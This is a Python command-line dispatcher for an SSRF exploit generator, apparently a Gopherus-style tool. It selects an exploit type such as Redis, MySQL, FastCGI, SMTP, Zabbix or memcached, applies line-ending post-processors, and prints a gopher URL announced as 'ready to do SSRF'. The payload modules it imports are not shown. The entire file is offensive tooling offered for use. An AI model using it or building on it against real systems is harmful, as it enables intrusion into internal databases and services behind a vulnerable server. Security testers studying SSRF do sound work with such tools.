#!/usr/bin/env python3
import argparse
import sys
from base64 import b64decode
import logging as log

from .module import DumpMemcached, FastCGI, MySQL, PHPMemcached, PlainText, PostgreSQL, PyMemcached, Redis, RbMemcached, SMTP, Zabbix
from .piper import LineN, LineRN, EndWith00, Default

BANNER = "ICAgICAgX19fX19fX18gICAgICAgICAgICAgIC5fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fX18gIAogICAgIC8gIF9fX19fLyAgX19fXyBfX19fX18gfCAgfF9fICAgX19fX19fX19fX18gX18gX18gIF9fX19fXyBcX19fX18gIFwgCiAgICAvICAgXCAgX19fIC8gIF8gXFxfX19fIFx8ICB8ICBcXy8gX18gXF8gIF9fIFwgIHwgIFwvICBfX18vICAgXyhfXyAgPCAKICAgIFwgICAgXF9cICAoICA8Xz4gKSAgfF8+ID4gICBZICBcICBfX18vfCAgfCBcLyAgfCAgL1xfX18gXCAgIC8gICAgICAgXAogICAgIFxfX19fX18gIC9cX19fXy98ICAgX18vfF9fX3wgIC9cX19fICA+X198ICB8X19fXy8vX19fXyAgPiAvX19fX19fICAvCiAgICAgICAgICAgIFwvICAgICAgIHxfX3wgICAgICAgIFwvICAgICBcLyAgICAgICAgICAgICAgICAgXC8gICAgICAgICBcLyAKCiA="

class_map = {
    "dmpmemcache": DumpMemcached.DumpMemcached,
    "fastcgi": FastCGI.FastCGI,
    "mysql": MySQL.MySQL,
    "phpmemcache": PHPMemcached.PHPMemcached,
    "plaintext": PlainText.PlainText,
    "postgresql": PostgreSQL.PostgreSQL,
    "pymemcache": PyMemcached.PyMemcached,
    "rbmemcache": RbMemcached.RbMemcached,
    "redis": Redis.Redis,
    "smtp": SMTP.SMTP,
    "zabbix": Zabbix.Zabbix,
}

piper_map = {
    "line-n": LineN,
    "line-rn": LineRN,
    "end-with-00": EndWith00,
    "default": Default,
}


def build_parser():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--exploit", help="exploit type", choices=class_map.keys())
    parser.add_argument("--host", help="gopher host", default="127.0.0.1")
    parser.add_argument("--port", help="gopher port", type=int, default=0)
    parser.add_argument("-v", "--verbose", help="verbose mode", action="count", default=0)
    parser.add_argument("--dump", help="dump generator status", action="store_true")
    parser.add_argument("--slient", "--silent", dest="silent", help="silent mode, stdout will only contain url", action="store_true")
    parser.add_argument("--post", help="post processor type: default preserves payload, line-n uses \\n, line-rn uses \\r\\n, end-with-00 appends 00", choices=piper_map.keys(), default="default")
    return parser


def print_banner():
    print("\033[96m", b64decode(BANNER).decode(), "\033[0m")


def run(argv=None):
    parser = build_parser()
    args, _ = parser.parse_known_args(argv)

    if not args.silent:
        print_banner()

    log.basicConfig(level=log.INFO if args.verbose == 0 else log.DEBUG)
    if not args.exploit:
        parser.print_help()
        return 1

    options = {
        "host": args.host,
        "port": args.port,
        "argv": argv,
    }

    exploit = class_map[args.exploit](parser, options)

    if args.dump:
        print("Dump status of generator needs to set debug mode -v")
        exploit.debug_dump()
        return 0

    final_payload = piper_map[args.post]().pipe(exploit.generate())
    if args.silent:
        print(final_payload)
        return 0

    print("\033[93m" + "\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
    print("\033[04m" + final_payload + "\033[0m")
    print("\n" + "\033[41m" + "-----------Made-by-Skyworship-----------" + "\033[0m")
    exploit.tailcall()
    return 0


def main():
    sys.exit(run())


if __name__ == "__main__":
    main()
